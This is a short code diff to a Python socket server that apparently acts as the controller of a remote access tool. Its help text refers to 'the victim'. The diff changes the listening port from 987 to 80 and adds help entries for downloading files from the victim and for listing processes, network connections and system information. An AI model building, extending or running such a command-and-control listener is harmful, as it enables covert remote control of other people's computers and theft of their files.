@@ -18,7 +18,7 @@ print('Waiting for Recieving Connection...')
 
 
 server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-ep = ('0.0.0.0', 987)
+ep = ('0.0.0.0', 80)
 server.bind(ep)
 server.listen(3)
 c, a = server.accept() # c for connection
@@ -37,6 +37,10 @@ while msg != 'exit':
             print('file downloaded !')
         elif msg == 'help':
             print('ip    to get ip address of the victim')
+            print('get   to download file')
+            print('ps')
+            print('connections')
+            print('sys')
         else:
             c.send(msg.encode('ascii'))
             rb = c.recv(1000000)
